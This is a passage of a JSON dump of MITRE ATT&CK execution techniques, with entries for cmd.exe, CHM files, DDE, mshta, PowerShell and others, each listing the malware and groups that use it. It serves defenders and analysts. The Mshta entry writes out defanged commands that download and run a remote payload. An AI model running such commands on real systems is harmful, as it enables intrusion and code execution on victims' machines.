                    "Description": "FIN7 used cmd.exe to launch commands on the victim’s machine.[38]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 executes commands remotely via cmd.exe.[39]"
                },
                {
                    "Name": "gh0st",
                    "Description": "gh0st RAT is able to open a command shell.[40]"
                },
                {
                    "Name": "Gold Dragon",
                    "Description": "Gold Dragon uses cmd.exe to execute commands for discovery.[41]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group malware can use cmd.exe to download and execute payloads and to execute commands on the system.[42]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT executes commands remotely on the infected host.[43]"
                },
                {
                    "Name": "H1N1",
                    "Description": "H1N1 kills and disables services by using cmd.exe.[44]"
                },
                {
                    "Name": "HARDRAIN",
                    "Description": "HARDRAIN uses cmd.exe to execute netshcommands.[45]"
                },
                {
                    "Name": "hcdLoader",
                    "Description": "hcdLoader provides command-line access to the compromised system.[46]"
                },
                {
                    "Name": "Helminth",
                    "Description": "Helminth can provide a remote shell.[47]"
                },
                {
                    "Name": "Hi-Zor",
                    "Description": "Hi-Zor has the ability to create a reverse shell.[48]"
                },
                {
                    "Name": "HOMEFRY",
                    "Description": "uses a command-line interface.[32]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Several commands are supported by the Honeybee's implant via the command-line interface and there’s also a utility to execute any custom command on an infected endpoint.[49]"
                },
                {
                    "Name": "HTTPBrowser",
                    "Description": "HTTPBrowser is capable of spawning a reverse shell on a victim.[50]"
                },
                {
                    "Name": "httpclient",
                    "Description": "httpclient opens cmd.exe on the victim.[2]"
                },
                {
                    "Name": "InnaputRAT",
                    "Description": "InnaputRAT launches a shell to execute commands on the victim’s machine.[51]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole can launch a remote shell to execute commands.[52]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN can use the command-line utility cacls.exe to change file permissions.[3]"
                },
                {
                    "Name": "Kasidet",
                    "Description": "Kasidet can execute commands using cmd.exe.[53]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar uses cmd.exe and /bin/bash to execute commands on the victim’s machine.[54]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Malware used by Ke3chang can run commands on the command-line interface.[55][56]"
                },
                {
                    "Name": "KEYMARBLE",
                    "Description": "KEYMARBLE can execute shell commands using cmd.exe.[57]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can open an interactive command-shell to perform command line functions on victim machines.[58]"
                },
                {
                    "Name": "KOMPROGO",
                    "Description": "KOMPROGO is capable of creating a reverse shell.[59]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware uses cmd.exe to execute commands on victims.[60][61][62][63]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan uses a backdoor known as BADFLICK that is is capable of generating a reverse shell.[32]"
                },
                {
                    "Name": "Linfo",
                    "Description": "Linfo creates a backdoor through which remote attackers can start a remote shell.[64]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound has used the command-line interface.[65]"
                },
                {
                    "Name": "Matroyshka",
                    "Description": "Matroyshka is capable of providing Meterpreter shell access.[66]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands.[67][68][69]"
                },
                {
                    "Name": "MirageFox",
                    "Description": "MirageFox has the capability to execute commands using cmd.exe.[70]"
                },
                {
                    "Name": "Mis-Type",
                    "Description": "Mis-Type uses cmd.exe to run commands for enumerating the host.[71]"
                },
                {
                    "Name": "Misdat",
                    "Description": "Misdat is capable of providing shell functionality to the attacker to execute commands.[71]"
                },
                {
                    "Name": "Mivast",
                    "Description": "Mivast has the capability to open a remote shell and run basic commands.[72]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind can execute commands via an interactive command shell.[73]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.[74]"
                },
                {
                    "Name": "MURKYTOP",
                    "Description": "uses the command-line interface.[32]"
                },
                {
                    "Name": "NavRAT",
                    "Description": "NavRAT leverages cmd.exe to perform discovery techniques.[75]"
                },
                {
                    "Name": "NETEAGLE",
                    "Description": "NETEAGLE allows adversaries to execute shell commands on the infected host.[13]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used the command-line interface for execution.[76][77][78][79]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE uses the command prompt to execute commands on the victim's machine.[77][80]"
                },
                {
                    "Name": "Orz",
                    "Description": "Orz can execute shell commands.[81]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork ran a reverse shell with Meterpreter.[82]"
                },
                {
                    "Name": "PHOREAL",
                    "Description": "PHOREAL is capable of creating reverse shell.[59]"
                },
                {
                    "Name": "Pisloader",
                    "Description": "Pisloader uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.[83]"
                },
                {
                    "Name": "PLAINTEE",
                    "Description": "PLAINTEE uses cmd.exe to execute commands on the victim’s machine.[84]"
                },
                {
                    "Name": "PlugX",
                    "Description": "PlugX allows actors to spawn a reverse shell on a victim.[50]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy creates a backdoor through which remote attackers can open a command-line interface.[85]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke runs cmd.exe /c and sends the output to its C2.[86]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER can execute commands from its C2 server.[76]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "Proxysvc executes a binary on the system and logs the results into a temp file by using: cmd.exe /c \" > %temp%\\PM* .tmp 2>&1\".[87]"
                },
                {
                    "Name": "Pteranodon",
                    "Description": "Pteranodon can execute commands on the victim.[88]"
                },
                {
                    "Name": "QUADAGENT",
                    "Description": "QUADAGENT uses cmd.exe to execute scripts and commands on the victim’s machine.[89]"
                },
                {
                    "Name": "QuasarRAT",
                    "Description": "QuasarRAT can launch a remote shell to execute commands on the victim’s machine.[90]"
                },
                {
                    "Name": "Rancor",
                    "Description": "Rancor has used cmd.exe to execute commmands.[84]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA uses cmd.exe to execute commands.[91][92]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves can receive and execute commands with cmd.exe. It can also provide a reverse shell.[68][93]"
                },
                {
                    "Name": "RGDoor",
                    "Description": "RGDoor uses cmd.exe to execute commands on the victim’s machine.[94]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "RogueRobin uses a command prompt to run a PowerShell script from Excel.[95]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM uses the command line and rundll32.exe to execute.[96]"
                },
                {
                    "Name": "Sakula",
                    "Description": "Sakula calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup. Sakula also has the capability to invoke a reverse shell.[97]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "SeaDuke is capable of executing commands.[98]"
                },
                {
                    "Name": "SEASHARPEE",
                    "Description": "SEASHARPEE can execute commands on victims.[79]"
                },
                {
                    "Name": "SNUGRIDE",
                    "Description": "SNUGRIDE is capable of executing commands and spawning a reverse shell.[93]"
                },
                {
                    "Name": "Sowbug",
                    "Description": "Sowbug has used command line during its intrusions.[99]"
                },
                {
                    "Name": "StreamEx",
                    "Description": "StreamEx has the ability to remotely execute commands.[100]"
                },
                {
                    "Name": "Suckfly",
                    "Description": "Several tools used by Suckfly have been command-line driven.[101]"
                },
                {
                    "Name": "TDTESS",
                    "Description": "TDTESS provides a reverse shell on the victim.[66]"
                },
                {
                    "Name": "TEXTMATE",
                    "Description": "TEXTMATE executes cmd.exe to provide a reverse shell to adversaries.[102][103]"
                },
                {
                    "Name": "Threat Group-1314",
                    "Description": "Threat Group-1314 actors spawned shells on remote systems on a victim network to execute commands.[104]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has used command-line interfaces for execution.[25]"
                },
                {
                    "Name": "TinyZBot",
                    "Description": "TinyZBot supports execution from the command-line.[105]"
                },
                {
                    "Name": "TURNEDUP",
                    "Description": "TURNEDUP is capable of creating a reverse shell.[106]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "TYPEFRAME can execute commands using a shell.[107]"
                },
                {
                    "Name": "Umbreon",
                    "Description": "Umbreon provides access using both standard facilities like SSH and additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet[108]"
                },
                {
                    "Name": "UPPERCUT",
                    "Description": "UPPERCUT uses cmd.exe to execute commands on the victim’s machine.[109]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer can execute commands on the victim's machine.[110][111]"
                },
                {
                    "Name": "Wiarp",
                    "Description": "Wiarp creates a backdoor through which remote attackers can open a command line interface.[112]"
                },
                {
                    "Name": "WINERACK",
                    "Description": "WINERACK can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.[11]"
                },
                {
                    "Name": "XTunnel",
                    "Description": "XTunnel has been used to execute remote commands.[26]"
                },
                {
                    "Name": "ZLib",
                    "Description": "ZLib has the ability to execute shell commands.[71]"
                }
            ]
        },
        "Compiled HTML File": {
            "Name": "Compiled HTML File",
            "Description": "Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. [1] CHM content is displayed using underlying components of the Internet Explorer browser [2] loaded by the HTML Help executable program (hh.exe). [3]Adversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. [4] [5]\n",
            "ID": "T1223",
            "Tactic": "Defense Evasion, Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Supports Remote: ": "No",
            "Defense Bypassed: ": "Application whitelisting",
            "Contributors: ": "Rahmat Nurfauzi, @infosecn1nja, PT Xynexis International",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Dark Caracal",
                    "Description": "Dark Caracal leveraged a compiled HTML file that contained a command to download and run an executable.[6]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group has used CHM files to move concealed payloads as part of.[7]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used a CHM payload to load and execute another malicious file once delivered to a victim.[8]"
                }
            ]
        },
        "Control Panel Items": {
            "Name": "Control Panel Items",
            "Description": "Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. [1] [2] Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. [1] [2] [3]For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. [1]Adversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via Spearphishing Attachment campaigns [2] [3] or executed as part of multi-stage malware. [4] Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting.\n",
            "ID": "T1196",
            "Tactic": "Defense Evasion, Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "API monitoring, Binary file metadata, DLL monitoring, Windows Registry, Windows event logs, Process command-line parameters, Process monitoring",
            "Supports Remote: ": "No",
            "Defense Bypassed: ": "Application whitelisting, Process whitelisting",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Reaver",
                    "Description": "Reaver drops and executes a malicious CPL file as its payload.[4]"
                }
            ]
        },
        "Dynamic Data Exchange": {
            "Name": "Dynamic Data Exchange",
            "Description": "Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. [1] [2] [3]Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands [4] [5], directly or through embedded files [6], and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. [7] DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.\n",
            "ID": "T1173",
            "Tactic": "Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "API monitoring, DLL monitoring, Process monitoring, Windows Registry, Windows event logs",
            "Supports Remote: ": "No",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 has delivered JHUHUGIT and Koadic by executing PowerShell commands through DDE in Word documents.[8][9][10]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 has used Windows DDE for execution of commands and a malicious VBS.[11]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has sent malicious Word OLE compound documents to victims.[12]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 spear phishing campaigns have included malicious Word documents with DDE execution.[13]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT has been delivered via Word documents using DDE for execution.[14]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork leveraged the DDE protocol to deliver their malware.[15]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS can use DDE to execute additional payloads on compromised hosts.[16]"
                }
            ]
        },
        "Execution through API": {
            "Name": "Execution through API",
            "Description": "Adversary tools may directly use the Windows application programming interface (API) to execute binaries. Functions such as the Windows API CreateProcess will allow programs and scripts to start other processes with proper path and argument parameters. [1]Additional Windows API calls that can be used to execute binaries include: [2]CreateProcessA() and CreateProcessW(),CreateProcessAsUserA() and CreateProcessAsUserW(),CreateProcessInternalA() and CreateProcessInternalW(),CreateProcessWithLogonW(), CreateProcessWithTokenW(),LoadLibraryA() and LoadLibraryW(),LoadLibraryExA() and LoadLibraryExW(),LoadModule(),LoadPackagedLibrary(),WinExec(),ShellExecuteA() and ShellExecuteW(),ShellExecuteExA() and ShellExecuteExW()\n",
            "ID": "T1106",
            "Tactic": "Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "API monitoring, Process monitoring",
            "Supports Remote: ": "No",
            "Contributors: ": "Stefan Kanthak",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL is capable of starting a process using CreateProcess.[3]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection.[4]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS has a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute.[5][6]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot creates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA().[7]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike's \"beacon\" payload is capable of running shell commands without cmd.exe and PowerShell commands without powershell.exe[8]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group malware can leverage the Windows API call, CreateProcessA(), for execution.[9]"
                },
                {
                    "Name": "InnaputRAT",
                    "Description": "InnaputRAT uses the API call ShellExecuteW for execution.[10]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito leverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions.[11]"
                },
                {
                    "Name": "PlugX",
                    "Description": "PlugX can use the Windows API function CreateProcess to execute another process.[12]"
                },
                {
                    "Name": "SynAck",
                    "Description": "SynAck parses the export tables of system DLLs to locate and call various Windows API functions.[13][14]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot uses the Windows API call, CreateProcessW(), to manage execution flow.[15]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer executes payloads using the Windows API call CreateProcessW().[16]"
                },
                {
                    "Name": "XAgentOSX",
                    "Description": "XAgentOSX contains the execFile function to execute a specified file on the system using the NSTask:launch method.[17]"
                }
            ]
        },
        "Execution through Module Load": {
            "Name": "Execution through Module Load",
            "Description": "The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess(), LoadLibrary(), etc. of the Win32 API. [1]The module loader can load DLLs:via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;via  in an embedded or external \"application manifest\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.Adversaries can use this functionality as a way to execute arbitrary code on a system.\n",
            "ID": "T1129",
            "Tactic": "Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "API monitoring, DLL monitoring, File monitoring, Process monitoring",
            "Contributors: ": "Stefan Kanthak",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq creates a backdoor through which remote attackers can load and call DLL functions.[2][3]"
                },
                {
                    "Name": "PUNCHBUGGY",
                    "Description": "PUNCHBUGGY can load a DLL using the LoadLibrary API.[4]"
                }
            ]
        },
        "Exploitation for Client Execution": {
            "Name": "Exploitation for Client Execution",
            "Description": "Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.Several types exist:Browser-based ExploitationWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.Office ApplicationsCommon office and productivity applications such as Microsoft Office are also targeted through Spearphishing Attachment, Spearphishing Link, and Spearphishing via Service. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.Common Third-party ApplicationsOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.\n",
            "ID": "T1203",
            "Tactic": "Execution",
            "Platform: ": "Linux, Windows, macOS",
            "Data Sources: ": "Anti-virus, System calls, Process monitoring",
            "Supports Remote: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT29",
                    "Description": "APT29 has used multiple software exploits for common client software, like Microsoft Word and Adobe Reader, to gain code execution as part of.[1]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 has used Flash Player (CVE-2016-4117, CVE-2018-4878) and Word (CVE-2017-0199) exploits for execution.[2][3][4]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot leverages a known zero-day vulnerability in Adobe Flash to execute the implant into the victims’ machines.[5]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has exploited Microsoft Word vulnerability CVE-2014-4114 for execution.[6]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, and CVE-2017-0199.[7][8][9][10][11][12][13]"
                },
                {
                    "Name": "DealersChoice",
                    "Description": "DealersChoice leverages vulnerable versions of Flash to perform execution.[14]"
                },
                {
                    "Name": "Elderwood",
                    "Description": "Elderwood has used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits.[15]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.[5]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.[16][17]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, and CVE-2015-1641.[18][19][20][21][22][23]"
                },
                {
                    "Name": "TA459",
                    "Description": "TA459 has exploited Microsoft Word vulnerability CVE-2017-0199 for execution.[24]"
                }
            ]
        },
        "Graphical User Interface": {
            "Name": "Graphical User Interface",
            "Description": "The Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as Remote Desktop Protocol, instead of through a Command-Line Interface, to search for information and execute files via mouse double-click events, the Windows Run command [1], or other potentially difficult to monitor interactions.\n",
            "ID": "T1061",
            "Tactic": "Execution",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters, Binary file metadata",
            "Supports Remote: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT3",
                    "Description": "APT3 has interacted with compromised systems to browse and copy files through its graphical user interface in Remote Desktop Protocol sessions.[2]"
                }
            ]
        },
        "InstallUtil": {
            "Name": "InstallUtil",
            "Description": "InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. [1] InstallUtil is located in the .NET directories on a Windows system: C:\\Windows\\Microsoft.NET\\Framework\\v\\InstallUtil.exe and C:\\Windows\\Microsoft.NET\\Framework64\\v\\InstallUtil.exe. InstallUtil.exe is digitally signed by Microsoft.Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute [System.ComponentModel.RunInstaller(true)]. [2]\n",
            "ID": "T1118",
            "Tactic": "Defense Evasion, Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, Process command-line parameters",
            "Supports Remote: ": "No",
            "Defense Bypassed: ": "Process whitelisting",
            "Contributors: ": "Casey Smith; Travis Smith, Tripwire",
            "Version": "1.0"
        },
        "Launchctl": {
            "Name": "Launchctl",
            "Description": "Launchctl controls the macOS launchd process which handles things like launch agents and launch daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. By loading or reloading launch agents or launch daemons, adversaries can install persistence or execute changes they made  [1]. Running a command from launchctl is as simple as launchctl submit -l  -- /Path/to/thing/to/execute \"arg\" \"arg\" \"arg\". Loading, unloading, or reloading launch agents or launch daemons can require elevated privileges. Adversaries can abuse this functionality to execute code or even bypass whitelisting if launchctl is an allowed process.\n",
            "ID": "T1152",
            "Tactic": "Defense Evasion, Execution, Persistence",
            "Platform: ": "macOS",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Supports Remote: ": "No",
            "Defense Bypassed: ": "Application whitelisting, Process whitelisting, Whitelisting by file name or path",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Calisto",
                    "Description": "Calisto uses launchctl to enable screen sharing on the victim’s machine.[2]"
                }
            ]
        },
        "Local Job Scheduling": {
            "Name": "Local Job Scheduling",
            "Description": "On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, [1] at, [2] and launchd. [3] Unlike Scheduled Task on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).cronSystem-wide cron jobs are installed by modifying /etc/crontab file, /etc/cron.d/ directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. [3] This works on macOS and Linux systems.Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, [4] [5] [6] [7] to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.atThe at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.launchdEach launchd job is described by a different configuration property list (plist) file similar to Launch Daemon or Launch Agent, except there is an additional key called StartCalendarInterval with a dictionary of time values. [3] This only works on macOS and OS X.\n",
            "ID": "T1168",
            "Tactic": "Persistence, Execution",
            "Platform: ": "Linux, macOS",
            "Permissions Required: ": "Administrator, User, root",
            "Data Sources: ": "File monitoring, Process monitoring",
            "Contributors: ": "Anastasios Pingios",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Janicab",
                    "Description": "Janicab used a cron job for persistence on Mac devices.[4]"
                }
            ]
        },
        "LSASS Driver": {
            "Name": "LSASS Driver",
            "Description": "The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. [1]Adversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., DLL Side-Loading or DLL Search Order Hijacking), an adversary can achieve arbitrary code execution triggered by continuous LSA operations.\n",
            "ID": "T1177",
            "Tactic": "Execution, Persistence",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "API monitoring, DLL monitoring, File monitoring, Kernel drivers, Loaded DLLs, Process monitoring",
            "Supports Remote: ": "No",
            "Contributors: ": "Vincent Le Toux",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Pasam",
                    "Description": "Pasam establishes by infecting the Security Accounts Manager (SAM) DLL to load a malicious DLL dropped to disk.[2]"
                },
                {
                    "Name": "Wingbird",
                    "Description": "Wingbird drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes.[3][4]"
                }
            ]
        },
        "Mshta": {
            "Name": "Mshta",
            "Description": "Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta. [1] HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. [2]Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code [3] [4] [5] [6] [7] Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]htaMshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. [8]\n",
            "ID": "T1170",
            "Tactic": "Defense Evasion, Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Process monitoring, Process command-line parameters",
            "Supports Remote: ": "No",
            "Defense Bypassed: ": "Application whitelisting",
            "Contributors: ": "Ricardo Dias; Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "FIN7",
                    "Description": "FIN7 has used mshta.exe to execute VBScript to execute malicious code on victim systems.[7]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can use MSHTA to serve additional payloads.[9]"
                },
                {
                    "Name": "MuddyWater",
                    "Description": "MuddyWater has used Mshta.exe to execute its POWERSTATS payload.[10]"
                },
                {
                    "Name": "NanHaiShu",
                    "Description": "NanHaiShu uses mshta.exe to load its program and files.[11]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS can use Mshta.exe to execute additional payloads on compromised hosts.[10]"
                }
            ]
        },
        "PowerShell": {
            "Name": "PowerShell",
            "Description": "PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. [1] Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.Administrator permissions are required to use PowerShell to connect to remote systems.A number of PowerShell-based offensive testing tools are available, including Empire, [2] PowerSploit, [3] and PSAttack. [4]\n",
            "ID": "T1086",
            "Tactic": "Execution",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator",
            "Data Sources: ": "Windows Registry, File monitoring, Process monitoring, Process command-line parameters",
            "Supports Remote: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT19",
                    "Description": "APT19 used PowerShell commands to execute payloads.[5]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 downloads and executes PowerShell scripts.[6]"
                },
                {
                    "Name": "APT29",
                    "Description": "APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke. APT29 also used PowerShell scripts to evade defenses.[7][8]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has used PowerShell on victim systems to download and run payloads after exploitation.[9]"
                },
                {
                    "Name": "APT32",
